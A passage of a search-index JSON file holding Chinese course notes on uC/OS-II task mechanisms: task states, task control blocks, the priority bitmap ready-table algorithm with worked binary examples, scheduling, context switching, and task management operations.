\u5982\u679c\u4efb\u52a1\u5728\u9700\u8981\u7b49\u5f85I/O\u8bbe\u5907\u6216\u5176\u4ed6\u4efb\u52a1\u63d0\u4f9b\u7684\u6570\u636e\uff0c\u5c31\u5904\u4e8e\u7b49\u5f85\u72b6\u6001\u3002 \\text{Figure 5. \u4efb\u52a1\u7684\u72b6\u6001\u4e0e\u53d8\u8fc1} \\text{Figure 6. \u4e09\u4e2a\u4efb\u52a1\u8fdb\u884c\u72b6\u6001\u8f6c\u6362\u7684\u8fc7\u7a0b} \\text{Figure 7. \u72b6\u6001\u53d8\u8fc1\u56fe}","title":"5. \u4efb\u52a1\u7684\u72b6\u6001\u4e0e\u53d8\u8fc1"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/5.uCos%E4%B8%AD%E7%9A%84%E4%BB%BB%E5%8A%A1%E6%9C%BA%E5%88%B6%E5%92%8C%E4%BC%98%E5%85%88%E7%BA%A7%E4%BD%8D%E5%9B%BE%E7%AE%97%E6%B3%95/#6","text":"\u5b9a\u4e49 \uff1a\u4efb\u52a1\u63a7\u5236\u5757\u662f\u5305\u542b\u4efb\u52a1\u76f8\u5173\u4fe1\u606f\u7684\u6570\u636e\u7ed3\u6784\uff0c\u5b83\u5305\u542b\u4e86\u4efb\u52a1\u6267\u884c\u8fc7\u7a0b\u4e2d\u6240\u9700\u8981\u7684\u6240\u6709\u4fe1\u606f \u4f5c\u7528 \uff1a\u4efb\u52a1\u7ba1\u7406\u662f\u901a\u8fc7\u5bf9\u4efb\u52a1\u63a7\u5236\u5757\uff08Task Control Block\uff0cTCB\uff09\u7684\u64cd\u4f5c\u6765\u5b9e\u73b0\u7684\u3002 \u5185\u5bb9 \uff1a\u4efb\u52a1\u63a7\u5236\u5757\u5927\u90fd\u5305\u62ec\u4ee5\u4e0b\u4fe1\u606f\uff1a \u4efb\u52a1\u7684\u540d\u5b57 \u4efb\u52a1\u6267\u884c\u7684\u8d77\u59cb\u5730\u5740 \u4efb\u52a1\u7684\u4f18\u5148\u7ea7 \u4efb\u52a1\u7684\u72b6\u6001 \u4efb\u52a1\u7684\u786c\u4ef6\u4e0a\u4e0b\u6587 \u5806\u6808\u6307\u9488\u3001PC\u548c\u5bc4\u5b58\u5668\u7b49 \u4efb\u52a1\u7684\u961f\u5217\u6307\u9488\u7b49\u5185\u5bb9","title":"6. \u4efb\u52a1\u63a7\u5236\u5757"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/5.uCos%E4%B8%AD%E7%9A%84%E4%BB%BB%E5%8A%A1%E6%9C%BA%E5%88%B6%E5%92%8C%E4%BC%98%E5%85%88%E7%BA%A7%E4%BD%8D%E5%9B%BE%E7%AE%97%E6%B3%95/#7","text":"\u5f53\u6709\u591a\u4e2a\u4efb\u52a1\u540c\u65f6\u5c31\u7eea\u65f6\uff0c\u5185\u6838\u5229\u7528\u7279\u5b9a\u7684\u7b97\u6cd5\u6c42\u51fa\u5f53\u524d\u5177\u6709\u6700\u9ad8\u4f18\u5148\u7ea7\u7684\u5c31\u7eea\u4efb\u52a1\u3002 \u5728\u5d4c\u5165\u5f0f\u5b9e\u65f6\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u5e38\u7528\u7684\u5c31\u7eea\u7b97\u6cd5\u662f\u4f18\u5148\u7ea7\u4f4d\u56fe\u7b97\u6cd5\u3002\u6211\u4eec\u4ee5uC/OS-II\u4e2d\u7684\u5b9e\u73b0\u4e3a\u4f8b\u6765\u8fdb\u884c\u8bb2\u8ff0\u3002","title":"7. \u5c31\u7eea\u7b97\u6cd5"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/5.uCos%E4%B8%AD%E7%9A%84%E4%BB%BB%E5%8A%A1%E6%9C%BA%E5%88%B6%E5%92%8C%E4%BC%98%E5%85%88%E7%BA%A7%E4%BD%8D%E5%9B%BE%E7%AE%97%E6%B3%95/#71","text":"\\text{Figure 8. \u5c31\u7eea\u8868}","title":"7.1. \u5c31\u7eea\u8868"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/5.uCos%E4%B8%AD%E7%9A%84%E4%BB%BB%E5%8A%A1%E6%9C%BA%E5%88%B6%E5%92%8C%E4%BC%98%E5%85%88%E7%BA%A7%E4%BD%8D%E5%9B%BE%E7%AE%97%E6%B3%95/#72","text":"","title":"7.2. \u4f18\u5148\u7ea7\u4f4d\u56fe\u7b97\u6cd5"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/5.uCos%E4%B8%AD%E7%9A%84%E4%BB%BB%E5%8A%A1%E6%9C%BA%E5%88%B6%E5%92%8C%E4%BC%98%E5%85%88%E7%BA%A7%E4%BD%8D%E5%9B%BE%E7%AE%97%E6%B3%95/#721","text":"\\text{Figure 9. \u4f18\u5148\u7ea7\u4f4d\u56fe\u7b97\u6cd5}","title":"7.2.1. \u4f18\u5148\u7ea7\u4f4d\u56fe"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/5.uCos%E4%B8%AD%E7%9A%84%E4%BB%BB%E5%8A%A1%E6%9C%BA%E5%88%B6%E5%92%8C%E4%BC%98%E5%85%88%E7%BA%A7%E4%BD%8D%E5%9B%BE%E7%AE%97%E6%B3%95/#722","text":"\\text{Figure 10. \u4efb\u52a1\u8fdb\u5165\u5c31\u7eea\u6001} // \u4efb\u52a1\u8fdb\u5165\u5c31\u7eea\u6001 OSRdyGrp |= OSMapTbl[priority >> 3]; OSRdyTbl[priority >> 3] |= OSMapTbl[priority & 0x07]; \u6211\u4eec\u5148\u6765\u5206\u6790\u4e00\u4e0b\u7b2c\u4e00\u884c\u4ee3\u7801\u3002\u5982\u56fe10\u4e2d\u6240\u793a\uff0c\u4efb\u52a1\u4f18\u5148\u7ea7\u4e3a35\u65f6\uff0c\u9996\u5148\u5c0635\u5316\u4e3a\u4e8c\u8fdb\u5236 priority = (00100011)_B \u5c06 priority \u53f3\u79fb\u4e09\u4f4d\uff0c\u5219\u5f97\u523035\u5728 OSMapTbl \u4e2d\u7684\u5bf9\u5e94\u4f4d\u7f6e priority \\gg 3 = (00100)_B = (4)_D \u4ece OSMapTbl \u8868\u4e2d\u8fdb\u884c\u7d22\u5f15 \\text{OSMapTbl[4]} = (00010000)_B \u5047\u8bbe OSRdyGrp \u4e3a\u5168 0 \uff0c \\text{OSMapTbl[4]} \u548c OSRdyGrp \u505a\u6216\u8fd0\u7b97 OSRdyGrp \uff5c (00010000)_B = (00010000)_B OSRdyGrp \u6807\u793a\u4e86\u67d0\u4e2a\u6216\u591a\u4e2a\u5c31\u7eea\u4efb\u52a1\u7684\u4f18\u5148\u7ea7\u5728 OSRdyTbl[4] \u8fd9\u4e00\u884c\u4e2d\u3002 \u63a5\u7740\u770b\u7b2c\u4e8c\u884c\u4ee3\u7801 // \u4efb\u52a1\u8fdb\u5165\u5c31\u7eea\u6001 OSRdyTbl[priority >> 3] |= OSMapTbl[priority & 0x07]; \\text{0x07} = (00000111)_B priority \u548c \\text{0x07} \u76f8\u4e0e\uff0c\u5373\u53d6 priority \u7684\u540e\u4e09\u4f4d\u4e8c\u8fdb\u5236\uff0c\u6b64\u5904\u4e3a (011)_B \uff0c\u5373 (3)_D \uff0c\u67e5\u8868\u53ef\u5f97 \\text{OSMapTbl}[3] = (00001000)_B \u5047\u8bbe OSRdyTbl[4] \u4e3a\u51680\uff0c \\text{OSMapTbl}[3] \u4e0e OSRdyTbl[4] \u76f8\u6216 \\text{OSRdyTbl[4]} \\ | \\ (00001000)_B = (00001000)_B \u518d\u653e\u5165 OSRdyTbl[4] \u4e2d\uff0c\u6807\u793a\u4e86\u5c31\u7eea\u7684\u4efb\u52a1\u4f18\u5148\u7ea7\u4e3a35\u3002","title":"7.2.2. \u4efb\u52a1\u8fdb\u5165\u5c31\u7eea\u6001"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/5.uCos%E4%B8%AD%E7%9A%84%E4%BB%BB%E5%8A%A1%E6%9C%BA%E5%88%B6%E5%92%8C%E4%BC%98%E5%85%88%E7%BA%A7%E4%BD%8D%E5%9B%BE%E7%AE%97%E6%B3%95/#723","text":"\\text{Figure 11. \u4efb\u52a1\u9000\u51fa\u5c31\u7eea\u6001} if((OSRdyTbl[priority >> 3] &= ~OSMapTbl[priority & 0x07]) == 0) OSRdyGrp &= ~OSMapTbl[priority >> 3]; \u63a5\u7740\u4e0a\u9762\u7684\u4f8b\u5b50\uff0c\u5f53\u4efb\u52a1\u9000\u51fa\u5c31\u7eea\u6001\u65f6 \\text{OSMapTbl}[3] = (00001000)_B ~ \u653e\u5728\u6570\u5b57\u524d\u8868\u793a\u53d6\u53cd \uff5e\\text{OSMapTbl}[3] = (11110111)_B \u4e0e OSRdyTbl[4] \u76f8\u4e0e \\text{OSRdyTbl[4]} \\ \\& \\ (11110111)_B = (00000000)_B = (0)_D \u6ee1\u8db3 if \u8bed\u53e5\u4e2d\u7684\u6761\u4ef6\uff0c\u5219 { \\begin{aligned} \\text{OSRdyGrp} &= \\text{OSRdyGrp}\\ \\& ~(00010000)_B & \\\\ &= (00010000)_B \\ \\& \\ (11101111)_B & \\\\ &= (00000000)_B \\ & \\\\ &= (0)_D \\ & \\\\ \\end{aligned} }","title":"7.2.3. \u4efb\u52a1\u9000\u51fa\u5c31\u7eea\u6001"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/5.uCos%E4%B8%AD%E7%9A%84%E4%BB%BB%E5%8A%A1%E6%9C%BA%E5%88%B6%E5%92%8C%E4%BC%98%E5%85%88%E7%BA%A7%E4%BD%8D%E5%9B%BE%E7%AE%97%E6%B3%95/#724","text":"\\text{Figure 12. \u4f18\u5148\u7ea7\u5224\u5b9a\u8868}","title":"7.2.4. \u4f18\u5148\u7ea7\u5224\u5b9a\u8868"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/5.uCos%E4%B8%AD%E7%9A%84%E4%BB%BB%E5%8A%A1%E6%9C%BA%E5%88%B6%E5%92%8C%E4%BC%98%E5%85%88%E7%BA%A7%E4%BD%8D%E5%9B%BE%E7%AE%97%E6%B3%95/#725","text":"y = OSUnMapTbl[OSRdyGrp]; x = OSUnMapTbl[OSRdyTbl[y]]; priority = (y << 3) + x; \\text{Figure 13. \u83b7\u53d6\u8fdb\u5165\u5c31\u7eea\u6001\u7684\u6700\u9ad8\u4f18\u5148\u7ea7}","title":"7.2.5. \u83b7\u53d6\u8fdb\u5165\u5c31\u7eea\u6001\u7684\u6700\u9ad8\u4f18\u5148\u7ea7"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/5.uCos%E4%B8%AD%E7%9A%84%E4%BB%BB%E5%8A%A1%E6%9C%BA%E5%88%B6%E5%92%8C%E4%BC%98%E5%85%88%E7%BA%A7%E4%BD%8D%E5%9B%BE%E7%AE%97%E6%B3%95/#8","text":"","title":"8. \u4efb\u52a1\u8c03\u5ea6"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/5.uCos%E4%B8%AD%E7%9A%84%E4%BB%BB%E5%8A%A1%E6%9C%BA%E5%88%B6%E5%92%8C%E4%BC%98%E5%85%88%E7%BA%A7%E4%BD%8D%E5%9B%BE%E7%AE%97%E6%B3%95/#81","text":"uC/OS-II\u603b\u662f\u9009\u62e9\u5c31\u7eea\u6001\u4efb\u52a1\u4e2d\u4f18\u5148\u7ea7\u6700\u9ad8\u7684\u4efb\u52a1\u6267\u884c \u7531\u8c03\u5ea6\u5668\u6765\u786e\u5b9a\u54ea\u4e2a\u4efb\u52a1\u4f18\u5148\u7ea7\u6700\u9ad8\u548c\u8fdb\u884c\u8c03\u5ea6\u5207\u6362 \u4efb\u52a1\u7ea7\u8c03\u5ea6\u662f\u7531\u51fd\u6570 OS_Sched() \u5b8c\u6210 \u4e2d\u65ad\u7ea7\u7684\u8c03\u5ea6\u662f\u7531\u51fd\u6570 OSIntExit() \u5b8c\u6210\u7684 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0cuC/OS-II\u7684\u8c03\u5ea6\u6267\u884c\u65f6\u95f4\u662f\u786e\u5b9a\u7684\u5e38\u6570\uff0c\u4e0e\u5e94\u7528\u7a0b\u5e8f\u5efa\u7acb\u7684\u4efb\u52a1\u6570\u91cf\u4ee5\u53ca\u5f53\u524d\u6700\u9ad8\u4f18\u5148\u7ea7\u4efb\u52a1\u7684\u4f4d\u7f6e\u6ca1\u6709\u5173\u7cfb","title":"8.1. \u6982\u8ff0"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/5.uCos%E4%B8%AD%E7%9A%84%E4%BB%BB%E5%8A%A1%E6%9C%BA%E5%88%B6%E5%92%8C%E4%BC%98%E5%85%88%E7%BA%A7%E4%BD%8D%E5%9B%BE%E7%AE%97%E6%B3%95/#82","text":"\\text{Figure 14. \u4efb\u52a1\u5207\u6362}","title":"8.2. \u4efb\u52a1\u5207\u6362"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/5.uCos%E4%B8%AD%E7%9A%84%E4%BB%BB%E5%8A%A1%E6%9C%BA%E5%88%B6%E5%92%8C%E4%BC%98%E5%85%88%E7%BA%A7%E4%BD%8D%E5%9B%BE%E7%AE%97%E6%B3%95/#83","text":"\u4fdd\u5b58\u4efb\u52a1 \u4e0a\u4e0b\u6587 \u73af\u5883 \u66f4\u65b0\u5f53\u524d\u8fd0\u884c\u4efb\u52a1\u7684 \u63a7\u5236\u5757 \u5185\u5bb9\uff0c\u5c06\u5176\u72b6\u6001\u6539\u4e3a\u5c31\u7eea\u6216\u7b49\u5f85\u72b6\u6001 \u5c06\u4efb\u52a1\u63a7\u5236\u5757\u79fb\u5230\u76f8\u5e94\u961f\u5217\uff08\u5c31\u7eea\u961f\u5217\u6216\u7b49\u5f85\u961f\u5217\uff0c\u6216\u8fdb\u884c\u4f4d\u56fe\u64cd\u4f5c\uff09 \u9009\u62e9\u53e6\u4e00\u4e2a\u4efb\u52a1\u8fdb\u884c\u6267\u884c(\u8c03\u5ea6) \u6539\u53d8\u9700\u6295\u5165\u8fd0\u884c\u4efb\u52a1\u7684\u63a7\u5236\u5757\u5185\u5bb9\uff0c\u5c06\u5176\u72b6\u6001\u53d8\u4e3a \u8fd0\u884c\u72b6\u6001 \u6062\u590d\u9700\u6295\u5165\u8fd0\u884c\u4efb\u52a1\u7684\u4e0a\u4e0b\u6587\u73af\u5883","title":"8.3. \u4efb\u52a1\u5207\u6362\u7684\u57fa\u672c\u6b65\u9aa4"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/5.uCos%E4%B8%AD%E7%9A%84%E4%BB%BB%E5%8A%A1%E6%9C%BA%E5%88%B6%E5%92%8C%E4%BC%98%E5%85%88%E7%BA%A7%E4%BD%8D%E5%9B%BE%E7%AE%97%E6%B3%95/#84","text":"\u4e2d\u65ad\u3001\u81ea\u9677(Traps) \u6b63\u5728\u8fd0\u884c\u4efb\u52a1\u56e0\u7f3a\u4e4f\u8d44\u6e90\u800c\u963b\u585e \u65f6\u95f4\u7247\u8f6e\u8f6c\u8c03\u5ea6\u65f6\u65f6\u95f4\u7247\u7528\u5c3d \u66f4\u9ad8\u4f18\u5148\u7ea7\u4efb\u52a1\u5c31\u7eea","title":"8.4. \u4efb\u52a1\u5207\u6362\u7684\u65f6\u673a"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/5.uCos%E4%B8%AD%E7%9A%84%E4%BB%BB%E5%8A%A1%E6%9C%BA%E5%88%B6%E5%92%8C%E4%BC%98%E5%85%88%E7%BA%A7%E4%BD%8D%E5%9B%BE%E7%AE%97%E6%B3%95/#9","text":"","title":"9. \u4efb\u52a1\u7ba1\u7406\u673a\u5236"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/5.uCos%E4%B8%AD%E7%9A%84%E4%BB%BB%E5%8A%A1%E6%9C%BA%E5%88%B6%E5%92%8C%E4%BC%98%E5%85%88%E7%BA%A7%E4%BD%8D%E5%9B%BE%E7%AE%97%E6%B3%95/#91","text":"\u521b\u5efa\u4efb\u52a1 \u7684\u8fc7\u7a0b\u5373\u4e3a\u5206\u914d\u4efb\u52a1\u63a7\u5236\u5757\u7684\u8fc7\u7a0b\u3002 \u5728\u521b\u5efa\u4efb\u52a1\u65f6\uff0c\u901a\u5e38\u9700\u8981\u786e\u5b9a\u4efb\u52a1\u7684\u540d\u5b57\u548c\u4efb\u52a1\u7684\u4f18\u5148\u7ea7\u7b49\u5185\u5bb9\uff0c \u786e\u7acb\u4efb\u52a1\u6240\u80fd\u4f7f\u7528\u7684\u5806\u6808\u533a\u57df\u3002 \u4efb\u52a1\u521b\u5efa\u6210\u529f\u540e\uff0c\u901a\u5e38\u4f1a\u4e3a\u7528\u6237\u8fd4\u56de\u4e00\u4e2a\u6807\u8bc6\u8be5\u4efb\u52a1\u7684ID\uff0c\u4ee5\u5b9e \u73b0\u5bf9\u4efb\u52a1\u7684\u5f15\u7528\u7ba1\u7406\u3002 \u5220\u9664\u4efb\u52a1 \u628a\u4efb\u52a1\u4ece\u7cfb\u7edf\u4e2d\u53bb\u6389\uff0c\u91ca\u653e\u5bf9\u5e94\u7684\u4efb\u52a1\u63a7\u5236\u5757\u3002 \u6302\u8d77/\u5524\u9192\u4efb\u52a1 \u628a\u4efb\u52a1\u53d8\u4e3a\u7b49\u5f85\u72b6\u6001\uff0c\u53ef\u901a\u8fc7\u5524\u9192\u4efb\u52a1\u64cd\u4f5c\u628a\u4efb\u52a1\u8f6c \u6362\u4e3a\u5c31\u7eea\u72b6\u6001\u3002 \u8bbe\u7f6e\u4efb\u52a1\u5c5e\u6027 \u53ef\u4ee5\u7528\u6765\u8bbe\u7f6e\u4efb\u52a1\u7684\u62a2\u5360\u3001\u65f6\u95f4\u7247\u7b49\u7279\u6027\uff0c\u4ee5\u786e\u5b9a\u662f \u5426\u5141\u8bb8\u4efb\u52a1\u5728\u6267\u884c\u8fc7\u7a0b\u4e2d\u88ab\u62a2\u5360\u6216\u662f\u5bf9\u540c\u4f18\u5148\u7ea7\u4efb\u52a1\u91c7\u7528\u65f6\u95f4\u7247\u8f6e \u8f6c\u65b9\u5f0f\u8fd0\u884c\u7b49\u3002 \u6539\u53d8\u4efb\u52a1\u4f18\u5148\u7ea7 \u7528\u6765\u6839\u636e\u9700\u8981\u6539\u53d8\u4efb\u52a1\u7684\u5f53\u524d\u4f18\u5148\u7ea7\u3002 \u83b7\u53d6\u4efb\u52a1\u4fe1\u606f \u83b7\u5f97\u4efb\u52a1\u7684\u5f53\u524d\u4f18\u5148\u7ea7\u3001\u4efb\u52a1\u7684\u5c5e\u6027\u3001\u4efb\u52a1\u7684\u540d\u5b57\u3001 \u4efb\u52a1\u7684\u4e0a\u4e0b\u6587\u3001\u4efb\u52a1\u7684\u72b6\u6001\u7b49\u5185\u5bb9\uff0c\u4fbf\u4e8e\u7528\u6237\u8fdb\u884c\u51b3\u7b56\u3002","title":"9.1. \u4e3b\u8981\u4efb\u52a1\u7ba1\u7406\u529f\u80fd"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/5.uCos%E4%B8%AD%E7%9A%84%E4%BB%BB%E5%8A%A1%E6%9C%BA%E5%88%B6%E5%92%8C%E4%BC%98%E5%85%88%E7%BA%A7%E4%BD%8D%E5%9B%BE%E7%AE%97%E6%B3%95/#92","text":"\u4efb\u52a1\u53ef\u4ee5\u5728\u591a\u4efb\u52a1\u8c03\u5ea6\u5f00\u59cb\u4e4b\u524d\u521b\u5efa\uff0c\u4e5f\u53ef\u4ee5\u5728\u5176\u5b83\u4efb\u52a1\u7684\u6267 \u884c\u8fc7\u7a0b\u4e2d\u521b\u5efa\u3002\u4f46\u4e0d\u80fd\u5728\u4e2d\u65ad\u670d\u52a1\u7a0b\u5e8f\u4e2d\u521b\u5efa\u3002\u5f00\u59cb\u591a\u4efb\u52a1\u8c03 \u5ea6\u4e4b\u524d\uff0c\u5fc5\u987b\u81f3\u5c11\u521b\u5efa\u4e00\u4e2a\u4efb\u52a1\u3002 \u5b9a\u4e49 \uff1a\u4efb\u52a1\u521b\u5efa\u4e3a\u4efb\u52a1\u5206\u914d\u548c\u521d\u59cb\u5316\u76f8\u5173\u7684\u6570\u636e\u7ed3\u6784\u3002 \u6240\u9700\u4fe1\u606f \uff1a \u4efb\u52a1\u521b\u5efa \u65f6\u901a\u5e38\u9700\u8981\u4f7f\u7528\u5982\u4e0b \u4fe1\u606f \uff1a \u4efb\u52a1\u7684\u540d\u5b57\u548c\u521d\u59cb\u4f18\u5148\u7ea7 \u4efb\u52a1\u6808 \u4efb\u52a1\u5c5e\u6027 \u4efb\u52a1\u5bf9\u5e94\u7684\u51fd\u6570\u5165\u53e3\u5730\u5740 \u4efb\u52a1\u5bf9\u5e94\u51fd\u6570\u7684\u53c2\u6570\u7b49 \u8fc7\u7a0b \uff1a\u4efb\u52a1\u521b\u5efa\u901a\u5e38\u9700\u8981 \u5b8c\u6210\u4ee5\u4e0b\u5de5\u4f5c \uff1a \u83b7\u5f97\u4efb\u52a1\u63a7\u5236\u5757TCB \u6839\u636e\u5b9e\u65f6\u5185\u6838\u7528\u6237\u63d0\u4f9b\u7684\u4fe1\u606f\u521d\u59cb\u5316TCB \u4e3a\u4efb\u52a1\u5206\u914d\u4e00\u4e2a\u53ef\u4ee5\u552f\u4e00\u6807\u8bc6\u4efb\u52a1\u7684ID \u4f7f\u4efb\u52a1\u5904\u4e8e\u5c31\u7eea\u72b6\u6001\uff0c\u628a\u4efb\u52a1\u653e\u7f6e\u5230\u5c31\u7eea\u961f\u5217 \u8fdb\u884c\u4efb\u52a1\u8c03\u5ea6\u5904\u7406","title":"9.2. \u521b\u5efa\u4efb\u52a1"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/5.uCos%E4%B8%AD%E7%9A%84%E4%BB%BB%E5%8A%A1%E6%9C%BA%E5%88%B6%E5%92%8C%E4%BC%98%E5%85%88%E7%BA%A7%E4%BD%8D%E5%9B%BE%E7%AE%97%E6%B3%95/#93","text":"\\text{Figure 15. \u5806\u6808\u7a7a\u95f4}","title":"9.3. \u5806\u6808\u7a7a\u95f4"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/5.uCos%E4%B8%AD%E7%9A%84%E4%BB%BB%E5%8A%A1%E6%9C%BA%E5%88%B6%E5%92%8C%E4%BC%98%E5%85%88%E7%BA%A7%E4%BD%8D%E5%9B%BE%E7%AE%97%E6%B3%95/#94","text":"\u5b9a\u4e49 \uff1a\u5185\u6838 \u6839\u636e\u4efb\u52a1\u521b\u5efa\u65f6\u83b7\u5f97\u7684ID\u5220\u9664\u6307\u5b9a\u7684\u4efb\u52a1 \u3002 \u8981\u70b9 \uff1a\u4efb\u52a1\u5220\u9664\u65f6\u9700\u8981 \u91ca\u653e\u8be5\u4efb\u52a1\u6240\u62e5\u6709\u7684\u8d44\u6e90 \u3002\u8fd9\u901a\u5e38\u7531 \u5185\u6838\u548c\u4efb\u52a1\u5171\u540c\u5b8c\u6210 \u3002 \u8fc7\u7a0b \uff1a\u4efb\u52a1\u5220\u9664\u901a\u5e38\u9700\u8981\u8fdb\u884c\u4ee5\u4e0b\u5de5\u4f5c\uff1a \u6839\u636e\u6307\u5b9a\u7684ID\uff0c\u83b7\u5f97\u5bf9\u5e94\u4efb\u52a1\u7684TCB \u628a\u4efb\u52a1\u7684TCB\u4ece\u961f\u5217\u4e2d\u53d6\u51fa\u6765\uff0c\u6302\u5165\u7a7a\u95f2TCB\u961f\u5217\u91ca\u653e\u4efb\u52a1\u6240\u5360\u7528\u7684\u8d44\u6e90","title":"9.4. \u5220\u9664\u4efb\u52a1"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/5.uCos%E4%B8%AD%E7%9A%84%E4%BB%BB%E5%8A%A1%E6%9C%BA%E5%88%B6%E5%92%8C%E4%BC%98%E5%85%88%E7%BA%A7%E4%BD%8D%E5%9B%BE%E7%AE%97%E6%B3%95/#95","text":"\u529f\u80fd \uff1a\u6302\u8d77\u6307\u5b9a\u4efb\u52a1\uff0c\u76f4\u5230\u901a\u8fc7\u5524\u9192\u4efb\u52a1\u5bf9\u4efb\u52a1\u8fdb\u884c\u89e3\u6302\u3002 \u4e00\u4e2a\u4efb\u52a1\u53ef\u4ee5 \u628a\u81ea\u5df1\u6302\u8d77 \u3002 \u5f53\u4efb\u52a1\u628a\u81ea\u5df1\u6302\u8d77\u540e\uff0c\u4f1a\u5f15\u8d77 \u4efb\u52a1\u7684\u8c03\u5ea6 \uff0c\u5b9e\u65f6\u5185\u6838\u5c06\u9009\u53d6\u53e6\u5916\u4e00\u4e2a\u5408\u9002\u7684\u4efb\u52a1\u8fdb\u884c\u6267\u884c\u3002 \u4efb\u52a1\u88ab\u6302\u8d77\u540e\uff0c\u8be5\u4efb\u52a1\u5c06\u5904\u4e8e \u7b49\u5f85\u72b6\u6001\uff08\u6216\u6302\u8d77\u72b6\u6001\uff09 \u3002 \u8fc7\u7a0b \uff1a\u6302\u8d77\u4efb\u52a1\u901a\u5e38\u9700\u8981\u8fdb\u884c\u4ee5\u4e0b\u5de5\u4f5c\uff1a \u6839\u636e\u6307\u5b9a\u7684ID\uff0c\u83b7\u5f97\u5bf9\u5e94\u4efb\u52a1\u7684TCB\uff1b \u628a\u4efb\u52a1\u7684\u72b6\u6001\u53d8\u4e3a\u7b49\u5f85\u72b6\u6001\uff0c\u5e76\u628a\u4efb\u52a1\u4ece\u5c31\u7eea\u961f\u5217\u6216\u5c31\u7eea\u8868\u4e2d\u79fb\u9664\uff1b \u5982\u679c\u4efb\u52a1\u81ea\u5df1\u6302\u8d77\u81ea\u5df1\uff0c\u8fdb\u884c\u4efb\u52a1\u8c03\u5ea6","title":"9.5. \u6302\u8d77\u4efb\u52a1"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/5.uCos%E4%B8%AD%E7%9A%84%E4%BB%BB%E5%8A%A1%E6%9C%BA%E5%88%B6%E5%92%8C%E4%BC%98%E5%85%88%E7%BA%A7%E4%BD%8D%E5%9B%BE%E7%AE%97%E6%B3%95/#96","text":"\u529f\u80fd \uff1a\u6839\u636e\u4efb\u52a1ID\u89e3\u6302\u6307\u5b9a\u7684\u4efb\u52a1\u3002 \u5982\u679c \u4efb\u52a1\u8fd8\u5728\u7b49\u5f85\u5176\u4ed6\u8d44\u6e90 \uff0c\u4efb\u52a1\u89e3\u6302\u540e\u4ecd\u7136\u5904\u4e8e\u7b49\u5f85\u72b6\u6001; \u5426\u5219\uff0c\u89e3\u6302\u540e\u7684\u4efb\u52a1\u5c06\u5904\u4e8e\u5c31\u7eea\u72b6\u6001\u3002 \u8fc7\u7a0b \uff1a\u89e3\u6302\u4efb\u52a1\u901a\u5e38\u9700\u8981\u8fdb\u884c\u4ee5\u4e0b\u5de5\u4f5c\uff1a \u6839\u636e\u6307\u5b9a\u7684ID\uff0c\u83b7\u5f97\u5bf9\u5e94\u4efb\u52a1\u7684TCB \u5982\u679c\u4efb\u52a1\u5728\u7b49\u5f85\u5176\u4ed6\u8d44\u6e90\uff0c\u4efb\u52a1\u5c06\u4ecd\u7136\u5904\u4e8e\u7b49\u5f85\u72b6\u6001\uff1b\u5426\u5219\uff0c\u628a\u4efb\u52a1\u7684\u72b6\u6001\u53d8\u4e3a\u5c31\u7eea\u72b6\u6001\uff0c\u5e76\u628aTCB\u653e\u7f6e\u5230\u5c31\u7eea\u961f\u5217 